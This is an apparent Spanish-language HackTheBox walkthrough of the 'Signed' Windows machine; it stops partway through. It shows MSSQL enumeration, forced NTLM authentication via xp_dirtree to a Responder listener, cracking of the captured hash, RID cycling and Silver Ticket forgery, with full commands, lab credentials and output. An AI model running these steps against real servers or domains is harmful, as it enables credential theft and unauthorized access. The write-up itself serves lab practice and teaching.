---
title: Signed - Medim (HTB)
permalink: /Signed-HTB-Writeup/
tags:
  - Windows
  - Medium
  - "MSSQL Enumeration"
  - xp_dirtree
  - "Coerced Auth"
  - "Hash Cracking"
  - "RID Cycling"
  - "Silver Ticket"
  - xp_cmdshell
  - "Port Forwarding"
  - Chisel
  - Proxychains
  - CVE-2025-33073
  - "NTLM Relay"
  - "Credentials Leakage"
  - OPENROWSET
  - BULK
  - Powershell
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Signed - Medim (HTB)
seo_description: Enumera y explota MSSQL, RID Cycling, Silver Ticket y CVE-2025-33073 para vencer Signed.
excerpt: Enumera y explota MSSQL, RID Cycling, Silver Ticket y CVE-2025-33073 para vencer Signed.
header:
  overlay_image: /assets/images/headers/signed-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/signed-hackthebox.jpg
---
![image-center](/assets/images/posts/signed-hackthebox.png)
{: .align-center}

**Habilidades:** MSSQL Enumeration, Abusing MSSQL Coerced Authentication, Hash Cracking, RID Cycling, Silver Ticket, Abusing `xp_cmdshell` to RCE, Port Forwarding - `chisel` + `proxychains`, CVE-2025-33073 - Windows `SMB` Client Privilege Escalation [Privilege Escalation] BONUS: File Read via `OPENROWSET(BULK)`- MSSQL, Credentials Leakage - `Powershell` History
{: .notice--primary}

# Introducción

Signed es una máquina Windows de dificultad `Medium` en HackTheBox donde debemos comprometer un servidor de `SQL Server` a través de un ataque de autenticación forzada, además de `RID Cycling` y `Silver Ticket` para ganar acceso inicial.

En cuanto a la escalada de privilegios, existen distintas vías para convertirnos en Administradores dentro del Controlador de Dominio, ya sea mediante lectura de archivos privilegiados dentro de `SQL Server` con la función `OPENROWSET()`, o bien, explotando la vulnerabilidad CVE-2025-33073, la cual nos otorgará control completo sobre el dominio.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c1 10.129.242.173                           
PING 10.129.242.173 (10.129.242.173) 56(84) bytes of data.
64 bytes from 10.129.242.173: icmp_seq=1 ttl=126 time=156 ms

--- 10.129.242.173 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 156.200/156.200/156.200/0.000 ms
~~~


## Port Scanning 

Lanzaremos un escaneo de puertos que intente identificar puertos abiertos en la máquina víctima

~~~ bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.242.173 -oG openPorts

Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-06 14:09 -0300
Nmap scan report for 10.129.242.173
Host is up (0.15s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
1433/tcp open  ms-sql-s

Nmap done: 1 IP address (1 host up) scanned in 46.04 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Solamente vemos el puerto `1433` abierto, el cual por defecto corre el servicio `Microsoft SQL Server`. Lanzaremos un segundo escaneo a este servicio para intentar identificar su versión

~~~ bash
nmap -p 1433 -sVC 10.129.242.173 -Pn -oN service

Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-06 14:13 -0300
Nmap scan report for DC01.signed.htb (10.129.242.173)
Host is up (0.15s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.129.242.173:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-02-06T16:42:06
|_Not valid after:  2056-02-06T16:42:06
| ms-sql-ntlm-info: 
|   10.129.242.173:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
|_ssl-date: 2026-02-06T17:13:20+00:00; -16s from scanner time.

Host script results:
|_clock-skew: mean: -15s, deviation: 0s, median: -16s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.18 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

La captura confirma que nos enfrentamos a un servidor `SQL Server 2022`, además se nos muestra tanto el nombre del host como de un dominio, y por esta información podemos intuir que estamos frente a un Controlador de Dominio.

Agregaremos tanto el nombre de host como del dominio a nuestro archivo `/etc/hosts` para aplicar correctamente las resoluciones DNS que hagan referencia al dominio

``` bash
echo '10.129.242.173 signed.htb DC01.signed.htb' | sudo tee -a /etc/hosts
 
10.129.242.173 signed.htb DC01.signed.htb
```


## MSSQL Enumeration

Podemos validar al usuario `scott` para verificar que pueda conectarse al servicio `mssql`

``` bash
nxc mssql DC01.signed.htb -u 'scott' -p 'Sm230#C5NatH' --local-auth 
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [+] DC01\scott:Sm230#C5NatH
```

Nos conectaremos al servicio `mssql` utilizando las credenciales proporcionadas, con el fin de enumerar la información útil que pueda contener este servicio

~~~ bash
mssqlclient.py signed.htb/scott:'Sm230#C5NatH'@DC01.signed.htb              
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (scott  guest@master)> 
~~~

La siguiente consulta muestra la versión de `SQL Server 2022`, en este caso se ejecuta en un `Windows Server 2019`

``` bash
SQL (scott  guest@master)> select @@version
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64) 
	Oct  8 2022 05:58:25 
	Copyright (C) 2022 Microsoft Corporation
	Enterprise Evaluation Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
   

```

### Guest Account

En este contexto, al conectarse a la base de datos `master`, el usuario `scott`  es asignado a la cuenta `guest`. Esto posiblemente se deba a que `scott` no tenga un usuario de base de datos explícito.

> La cuenta `guest` en el contexto de `SQL Server` permite que los inicios de sesión sin un usuario de base de datos específico asignado a ellos accedan a una base de datos.
{: .notice--info}

``` bash
SQL (scott  guest@master)> select current_user
        
-----   
guest 
```

### Databases

Si listamos las bases de datos existentes, solamente veremos las predeterminadas (siendo `msdb` un posible objetivo interesante)

> La base de datos `msdb` es una base de datos crítica del sistema SQL Server que utiliza principalmente el Agente de `SQL Server` para programar y administrar alertas, trabajos y el historial de diversas actividades de la base de datos, como copias de seguridad y restauraciones.
{: .notice--info}

``` bash
SQL (scott  guest@master)> SELECT name FROM sys.databases;
name     
------   
master   

tempdb   

model    

msdb
```

### Privileges

En este punto no vemos un vector claro de movimiento lateral/escalada de privilegios, debemos continuar enumerando posibles vectores, ya sea a nivel de privilegios, roles y/o funcionalidades del servidor (`xp_cmdshell`, servidores vinculados, `SQL Agent`, etc.).

La siguiente consulta muestra los permisos del usuario actual, veremos que poseemos los permisos `CONNECT SQL` y `VIEW ANY DATABASE`

``` bash
SQL (scott  guest@master)> SELECT * FROM fn_my_permissions(NULL, 'SERVER')
entity_name   subentity_name   permission_name     
-----------   --------------   -----------------   
server                         CONNECT SQL         

server                         VIEW ANY DATABASE 
```

### Sysadmin

En cuanto a usuarios `sysadmin` dentro de `mssql`, veremos al grupo de dominio `IT`.

> El rol fijo de servidor `sysadmin` en `SQL Server` es el nivel de acceso más alto y potente, permitiendo a sus miembros realizar cualquier actividad en la instancia del servidor, sin restricciones.
{: .notice--info}

``` bash
# Privilegios para la cuenta acutal: guest
SQL (scott  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin')
    
-   
0 

SQL (SIGNED\mssqlsvc  guest@master)> SELECT name FROM master.sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;
name                        
-------------------------   
sa                          

SIGNED\IT                   

NT SERVICE\SQLWriter        

NT SERVICE\Winmgmt          

NT SERVICE\MSSQLSERVER      

NT SERVICE\SQLSERVERAGENT 
```

### Stored Procedures

Al intentar habilitar el procedimiento almacenado `xp_cmdshell` (el cual nos permitiría ejecutar comandos en el sistema), veremos que no tenemos los permisos suficientes

``` bash
SQL (scott  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```

Es posible ejecutar el procedimiento almacenado `xp_dirtree` para intentar listar el sistema de archivos.

> `xp_dirtree` es un procedimiento almacenado extendido (`XP`) en Microsoft SQL Server que permite listar el contenido de un directorio del sistema de archivos, devolviendo archivos y subdirectorios como una tabla.
{: .notice--info}

Aunque si intentamos listar el contenido de la unidad `C:`, no veremos ninguna salida, posiblemente debido a configuración de seguridad adicional que nos deniega el acceso

``` bash
SQL (scott  guest@master)> EXEC master..xp_dirtree 'C:\', 1, 1;
subdirectory   depth   file   
------------   -----   ---- 
```

### Linked Servers

Al listar los servidores vinculados, veremos una referencia hacia el mismo Controlador de Dominio, esto se conoce como `Self-Mapping`

``` bash
SQL (scott  guest@master)> enum_links
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------   ----------------   -----------   --------------   ------------------   ------------   -------   
DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL      

Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------

SQL (scott  guest@master)> SELECT @@SERVERNAME
       
----   
DC01  
```
<br>


# Intrusión / Explotación
---
## Abusing MSSQL Coerced Authentication

Aunque no podamos listar el sistema de archivos del servidor, aún existe la posibilidad de intentar explotar el procedimiento almacenado `xp_dirtree` porque podemos ejecutarlo.

El riesgo involucra el funcionamiento legítimo de `xp_dirtree`, el cual acepta rutas `UNC`, lo que permite usar recursos compartidos `SMB`.

> Las rutas de la [Convención de Nomenclatura Universal](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) (`UNC`), que se utilizan para acceder a los recursos de red, tienen el siguiente formato:
> 
> - Un nombre de servidor o host, precedido por `\\`. El nombre del servidor puede ser un nombre de máquina NetBIOS o una dirección `IP`/`FQDN` (se admiten tanto `IPv4` como `v6`).
> - Un nombre de recurso compartido, separado del nombre de host por `\`.
> - Un nombre de directorio.
> - Un nombre de archivo opcional.
{: .notice--info}

Con esta funcionalidad podemos forzar a que el servidor de `SQL Server` se conecte a un recurso compartido desde nuestra dirección IP, desencadenando autenticación `NTLM` en el proceso (utilizando la cuenta de servicio que ejecuta `SQL Server`), la cual podemos capturar con herramientas como `Responder` o `impacket-smbserver`

### Exploiting

Iniciaremos `responder` para capturar el tráfico, de forma que cuando iniciemos la autenticación, veremos un hash `NetNTLMv2` proveniente del servidor `MSSQL`

``` bash
sudo responder -i 10.10.14.54 -I tun0 -wv

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
...
<SNIP>
...
```

Desde nuestra sesión en `mssql` ejecutaremos el procedimiento almacenado `xp_dirtree` de cualquiera de las siguientes maneras, ambas iniciarán autenticación `NTLM` buscando el recurso `test`

``` bash
SQL (scott  guest@master)> xp_dirtree \\10.10.14.54\test
SQL (scott  guest@master)> EXEC xp_dirtree '\\10.10.14.54\test'
```

Desde nuestro listener veremos un hash `NetNTLMv2` perteneciente al usuario `mssqlsvc`

~~~ bash
...
<SNIP>
...
[SMB] NTLMv2-SSP Client   : 10.129.242.173
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:790aa58c7c462fc3:F5112C963AACC73161C75C45D320C6E6:010100000000000080E251569D92DC015C149B94A1BB021B0000000002000800520030004C00350001001E00570049004E002D0059005400420049004B0045004500570057003900370004003400570049004E002D0059005400420049004B004500450057005700390037002E00520030004C0035002E004C004F00430041004C0003001400520030004C0035002E004C004F00430041004C0005001400520030004C0035002E004C004F00430041004C000700080080E251569D92DC0106000400020000000800300030000000000000000000000000300000698C256C7143C03424E7DFFAA110F6C9A28A525970C4B246B57CD2582181D15A0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00350034000000000000000000
~~~


## Hash Cracking

Podemos intentar descifrar este hash con herramientas como `john` o `hashcat`, empleando un ataque basado en diccionarios

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt                   
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
purPLE9795!@     (mssqlsvc)
~~~

Hemos conseguido la contraseña para la cuenta `mssqlsvc`, podemos validarla con la herramienta `netexec`

``` bash
nxc mssql DC01.signed.htb -u 'mssqlsvc' -p 'purPLE9795!@'             
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@
```


## MSSQL Access as `mssqlsvc`

Nos conectaremos al servicio `mssql` con las credenciales de la cuenta `mssqlsvc`, en este caso necesitaremos agregar la flag `-windows-auth` 

~~~ bash
mssqlclient.py signed.htb/mssqlsvc:'purPLE9795!@'@DC01.signed.htb -windows-auth

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  guest@master)> 
~~~

- `-windows-auth`: Usar la autenticación de Windows para iniciar la conexión.

### Privileges

Si enumeramos privilegios dentro de `mssql` nuevamente, solamente veremos permisos de lectura

``` bash
SQL (SIGNED\mssqlsvc  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin')
    
-   
0  

SQL (SIGNED\mssqlsvc  guest@master)> SELECT * FROM fn_my_permissions(NULL, 'SERVER')
entity_name   subentity_name   permission_name                   
-----------   --------------   -------------------------------   
server                         CONNECT SQL                       

server                         VIEW ANY DATABASE                 

server                         VIEW ANY SECURITY DEFINITION      

server                         VIEW ANY PERFORMANCE DEFINITION   

server                         VIEW ANY DEFINITION
```

### Stored Procedures

En cuanto a procedimientos almacenados, como `xp_cmdshell`, aún no poseemos los permisos suficientes para configurar esta funcionalidad

``` bash
SQL (SIGNED\mssqlsvc  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement
```

Sin embargo, si poseemos los permisos suficientes para listar archivos usando `xp_dirtree`

``` bash
SQL (SIGNED\mssqlsvc  guest@master)> xp_dirtree C:\
subdirectory                depth   file   
-------------------------   -----   ----   
$Recycle.Bin                    1      0   

Config.Msi                      1      0   

Documents and Settings          1      0   

inetpub                         1      0   

PerfLogs                        1      0   

Program Files                   1      0   

Program Files (x86)             1      0   

ProgramData                     1      0   

SQL2022                         1      0   

System Volume Information       1      0   

Users                           1      0   

Windows                         1      0 
```


## RID Cycling

La técnica `RID Cycling` permite enumerar objetos del dominio mediante fuerza bruta o adivinando `RIDs` basándose en el hecho de que este valor es secuencial (típicamente desde el valor `500` en adelante).

> `RID` significa Identificador Relativo (`Relative Identifier`), que es un número único asignado a cada objeto de seguridad (usuario, grupo, equipo) dentro de un dominio y forma parte de su Identificador de Seguridad (`SID`) único.
{: .notice--info}

Desde la versión [`1.4.0`](https://github.com/Pennyw0rth/NetExec/pull/492), la herramienta `netexec` integra la opción `--rid-brute` para realizar un ataque de `RID Cycling` a través del protocolo `mssql`. 

Esta opción es mucho más cómoda que enumerar manualmente cada usuario dentro de `mssqlclient`

``` bash
nxc mssql DC01.signed.htb -u 'mssqlsvc' -p 'purPLE9795!@' --rid-brute

MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@ 
MSSQL       10.129.242.173  1433   DC01             498: SIGNED\Enterprise Read-only Domain Controllers
MSSQL       10.129.242.173  1433   DC01             500: SIGNED\Administrator
MSSQL       10.129.242.173  1433   DC01             501: SIGNED\Guest
MSSQL       10.129.242.173  1433   DC01             502: SIGNED\krbtgt
MSSQL       10.129.242.173  1433   DC01             512: SIGNED\Domain Admins
MSSQL       10.129.242.173  1433   DC01             513: SIGNED\Domain Users
MSSQL       10.129.242.173  1433   DC01             514: SIGNED\Domain Guests
MSSQL       10.129.242.173  1433   DC01             515: SIGNED\Domain Computers
MSSQL       10.129.242.173  1433   DC01             516: SIGNED\Domain Controllers
MSSQL       10.129.242.173  1433   DC01             517: SIGNED\Cert Publishers
MSSQL       10.129.242.173  1433   DC01             518: SIGNED\Schema Admins
MSSQL       10.129.242.173  1433   DC01             519: SIGNED\Enterprise Admins
MSSQL       10.129.242.173  1433   DC01             520: SIGNED\Group Policy Creator Owners
MSSQL       10.129.242.173  1433   DC01             521: SIGNED\Read-only Domain Controllers
MSSQL       10.129.242.173  1433   DC01             522: SIGNED\Cloneable Domain Controllers
MSSQL       10.129.242.173  1433   DC01             525: SIGNED\Protected Users
MSSQL       10.129.242.173  1433   DC01             526: SIGNED\Key Admins
MSSQL       10.129.242.173  1433   DC01             527: SIGNED\Enterprise Key Admins
MSSQL       10.129.242.173  1433   DC01             553: SIGNED\RAS and IAS Servers
MSSQL       10.129.242.173  1433   DC01             571: SIGNED\Allowed RODC Password Replication Group
MSSQL       10.129.242.173  1433   DC01             572: SIGNED\Denied RODC Password Replication Group
MSSQL       10.129.242.173  1433   DC01             1000: SIGNED\DC01$
MSSQL       10.129.242.173  1433   DC01             1101: SIGNED\DnsAdmins
MSSQL       10.129.242.173  1433   DC01             1102: SIGNED\DnsUpdateProxy
MSSQL       10.129.242.173  1433   DC01             1103: SIGNED\mssqlsvc
MSSQL       10.129.242.173  1433   DC01             1104: SIGNED\HR
MSSQL       10.129.242.173  1433   DC01             1105: SIGNED\IT
MSSQL       10.129.242.173  1433   DC01             1106: SIGNED\Finance
MSSQL       10.129.242.173  1433   DC01             1107: SIGNED\Developers
MSSQL       10.129.242.173  1433   DC01             1108: SIGNED\Support
MSSQL       10.129.242.173  1433   DC01             1109: SIGNED\oliver.mills
MSSQL       10.129.242.173  1433   DC01             1110: SIGNED\emma.clark
MSSQL       10.129.242.173  1433   DC01             1111: SIGNED\liam.wright
MSSQL       10.129.242.173  1433   DC01             1112: SIGNED\noah.adams
MSSQL       10.129.242.173  1433   DC01             1113: SIGNED\ava.morris
MSSQL       10.129.242.173  1433   DC01             1114: SIGNED\sophia.turner
MSSQL       10.129.242.173  1433   DC01             1115: SIGNED\james.morgan
MSSQL       10.129.242.173  1433   DC01             1116: SIGNED\mia.cooper
MSSQL       10.129.242.173  1433   DC01             1117: SIGNED\elijah.brooks
MSSQL       10.129.242.173  1433   DC01             1118: SIGNED\isabella.evans
MSSQL       10.129.242.173  1433   DC01             1119: SIGNED\lucas.murphy
MSSQL       10.129.242.173  1433   DC01             1120: SIGNED\william.johnson
MSSQL       10.129.242.173  1433   DC01             1121: SIGNED\charlotte.price
MSSQL       10.129.242.173  1433   DC01             1122: SIGNED\henry.bennett
MSSQL       10.129.242.173  1433   DC01             1123: SIGNED\amelia.kelly
MSSQL       10.129.242.173  1433   DC01             1124: SIGNED\jackson.gray
MSSQL       10.129.242.173  1433   DC01             1125: SIGNED\harper.diaz
MSSQL       10.129.242.173  1433   DC01             1126: SIGNED\SQLServer2005SQLBrowserUser$DC01
```

Podemos aplicar una serie de filtros para extraer rápidamente un listado de usuarios posibles

``` bash
nxc mssql DC01.signed.htb -u 'mssqlsvc' -p 'purPLE9795!@' --rid-brute | grep -E '1[0-9][0-9][0-9]:|2[0-9][0-9][0-9]:' | awk '{print $NF}' | cut -d '\' -f2-2 | grep -E '\.' | grep -v '\$' | tee users.txt

oliver.mills
emma.clark
liam.wright
noah.adams
ava.morris
sophia.turner
james.morgan
mia.cooper
elijah.brooks
isabella.evans
lucas.murphy
william.johnson
charlotte.price
henry.bennett
amelia.kelly
jackson.gray
harper.diaz
```


## Silver Ticket

> Un `Silver Ticket` es un tipo de ataque de post-explotación en entornos de `Active Directory` (AD) que permite a un atacante falsificar un Ticket de Servicio (ST) para obtener acceso no autorizado a un servicio específico.
{: .notice--info}

Ahora mismo estamos en un escenario donde no tenemos conectividad completa con los servicios de `Active Directory`, como `LDAP`, `Kerberos`, etc. Solamente tenemos alcance hacia el Controlador de Dominio vía `mssql`.

Realizaremos un ataque de `Silver Ticket`, donde nos conectaremos a `mssql` con un ticket que nos otorgue privilegios dentro de este servicio

### Understanding Attack

En el flujo `kerberos`, cuando un cliente (cuenta de usuario) solicita acceso a un servicio, solicita un `TGS` al `KDC`(`Key Distribution Center`). Este proceso se basa en dos paquetes, `KRB_TGS_REQ` y `KRB_TGS_REP`.

Este ticket está cifrado con el hash `NT` de la cuenta que ejecuta el servicio (en este caso poseemos la contraseña de la cuenta `mssqlsvc`, la cual ejecuta `mssql`). 

Si un atacante logra extraer el hash `NTLM` o la contraseña de esta cuenta, puede falsificar tickets de servicio válidos para conectarse a él sin necesidad de conectarse al `KDC`.

> Para este ataque necesitaremos conocer la contraseña o equivalente hash `NT`, además del `SID`, el nombre del dominio y el `SPN` (`Service Principal Name`) del servicio objetivo.
{: .notice--warning}

 Cuando creamos un `Silver Ticket`, podemos especificar membresía de grupos, como `Domain Admins`, `Enterprise Admins`, o cualquier otro grupo de `AD`.
 
 Cuando el cliente presente este ticket falso, el servidor descifrará el ticket de servicio (`ST`) y confiará en las membresías de grupo que contenga el ticket sin verificarlas, permitiendo el acceso.
 
 En este caso, `mssql` otorgará los privilegios correspondientes dependiendo de su configuración.

> Cabe destacar que aunque forjemos un ticket como `Domain Admins`, solamente tendremos esos privilegios dentro del servicio que solicitamos, no a nivel de dominio.
> 
> Por lo que, si ejecutamos comandos, lo haremos como la cuenta que ejecuta `mssql`, sin privilegios de `Domain Admin` (sería una catástrofe).
{: .notice--danger}

Para una comprensión más profunda de este ataque, recomiendo el [siguiente blog](https://en.hackndo.com/kerberos-silver-golden-tickets/)

### NT Hash

Con el siguiente comando podremos convertir la contraseña en un hash `NT` (por comodidad podemos asignarlo a una variable de entorno)

``` bash
export NT_HASH=$(printf '%s' 'purPLE9795!@'| iconv -t utf16le | openssl md4 | awk '{print $NF}')

echo $NT_HASH                                       
ef699384c3285c54128a3ee1ddb1a0cc
```

### Security Identifier (`SID`)

Para poder crear tickets de servicio, además de la contraseña/hash `NT` de la cuenta de usuario, necesitaremos el `SID` del dominio.

> Un [Identificador de Seguridad (`SID`)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers#sid-architecture) en `Windows` es una cadena alfanumérica única e inmutable que el sistema operativo genera automáticamente al crear cuentas de usuario, grupos o equipos.
{: .notice--info}

Dentro del servidor `mssql`, podemos utilizar la función `SUSER_SID()` para buscar el `SID` de un usuario o grupo específico.

> La cadena resultante puede resultar un poco confusa, pero solamente está representada en bytes.
{: .notice--warning}

Recordemos que durante la [[#Sysadmin|enumeración de `mssql`]], verificamos las entidades con privilegios `sysadmin`, donde vimos que el grupo `IT` posee dichos privilegios 

``` bash
SQL (SIGNED\mssqlsvc  guest@master)> select suser_sid('SIGNED\IT')
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'

SQL (SIGNED\mssqlsvc  guest@master)> select suser_sid('SIGNED\Administrator')
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca4f4010000'
```

Un `SID` posee `4` componentes principales, los cuales son:

- Nivel de revisión (`1`).
- Un identificador de autoridad (`5`, `NT Authority`).
- Identificador de dominio (`32`, incorporado).
- Un `RID` (por ejemplo, `544` para el grupo `Administrators`). 

> La estructura de un `SID` se compone de la siguiente manera:
> - `S-R-X-Y1-Y2-Yn-1-Yn`:
> 	- `S`: Indica que la cadena es una `SID`.
> 	- `R`: Indica el nivel de revisión, actualmente siempre es `1`.
> 	- `X`: Indica el valor de la autoridad identificadora (`Identifier Authority`).
> 	- `Y`: Representa una serie de valores de sub autoridad (`Subauthority`). donde `n` representa el número de valores.
{: .notice--info}

El último campo `Subauthority` representa el valor del `RID`, que identifica al usuario/grupo.

> Un `RID` (`Relative Identifier` o `Identificador Relativo`) en `Windows` es un número único de longitud variable que se asigna a usuarios, grupos u objetos de equipo al crearlos.
{: .notice--info}

Para representarlos, como los bytes se rigen por el orden `little-endian`, debemos representarlos en el orden contrario

``` bash
'51 04 00 00' -> '00 00 04 51'
echo "$((0x00000451))" # IT Group's SID
1105

'f4 01 00 00' -> '00 00 01 f4'
echo "$((0x000001f4))" # Administrator's SID        
500
```

Para reconstruir el `SID` debemos regirnos por su composición a nivel de `bytes`:

| Tamaño | Bytes             | Contenido                  | Valor (decimal) |
| ------ | ----------------- | -------------------------- | --------------- |
| 1      | `01`              | Revisión                   | `1`             |
| 1      | `05`              | Cantidad de `SubAuthority` | `5`             |
| 6      | ``000000000005``  | `Authority Identifier`     | `5`             |
| 4      | `15000000`        | `Subauthority 1`           | `21`            |
| 4      | `5b7bb0f3`        | `Subauthority 2`           | `4088429403`    |
| 4      | `98aa2245`        | `Subauthority 3`           | `1159899800`    |
| 4      | `ad4a1ca4`        | `Subauthority 4`           | `2753317549`    |
| 4      | `51040000` (`IT`) | `Subauthority 5` (`RID`)   | `1105`          |

Uniremos las partes hasta antes del `RID` (el cual identifica al usuario/grupo), el cual nos quedaría representado como `S-1-5-21-4088429403-1159899800-2753317549`

### Ticket Forgery

Con la información preparada, crearemos un ticket de servicio añadiendo la membresía del grupo `IT` y especificando el `SPN` del servicio `mssql`

``` bash
ticketer.py -domain signed.htb -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -spn mssqlsvc/dc01.signed.htb:1433 -groups 1105 -user-id 1103 -nthash "$NT_HASH" mssqlsvc

Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/mssqlsvc
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

- `-spn`: `Service Principal Name`, identifica la cuenta de servicio en el protocolo `kerberos`.
- `-groups 1105`: `RID` del grupo `IT`.
- `-user-id 1103`: `RID` de la cuenta `mssqlsvc`.

### MSSQL Access

Cargaremos el ticket en la variable de entorno `KRB5CCNAME`, ya sea con el comando `export` o pasándola directamente sobre el comando donde lo utilizaremos (como en el siguiente ejemplo). 

Necesitaremos usar las flags `-k -no-pass` para habilitar la autenticación `kerberos`.

> Como estamos utilizando un ticket de servicio (`ST`), no se necesita conectar con el `KDC`. 
{: .notice--warning}

``` bash
KRB5CCNAME=mssqlsvc.ccache mssqlclient.py -k -no-pass DC01.signed.htb -debug

Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /root/.local/share/pipx/venvs/impacket/lib/python3.11/site-packages/impacket
